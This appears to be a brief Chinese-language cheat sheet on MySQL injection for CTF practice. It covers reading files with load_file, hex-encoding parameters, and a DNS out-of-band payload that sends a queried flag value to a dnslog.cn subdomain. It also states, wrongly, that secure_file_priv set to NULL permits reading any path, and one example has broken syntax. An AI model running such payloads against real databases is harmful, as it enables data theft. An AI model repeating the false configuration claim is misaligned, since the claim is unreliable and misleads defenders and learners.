root权限才可使用load_file等高危函数
secure_file_priv权限为null时load_file才可读取任意路径
load_file('绝对路径');
高频语句,读取路径内文件的内容并返回
hex(load_file('绝对路径');)
手动将内容转换成十六进制编码,以防出现不可控问题
select * from user where id='参数';
所有为参数的位置都可写十六进制由sql自动转义写入(参数位就是用字符串或数值类型写入的位置)

带外注入
dns带外注入:
select load_file(concat('\\\\',(select flag from `191981093114514`),'.xxx.dnslog.cn\\a'));
需要权限和53端口开启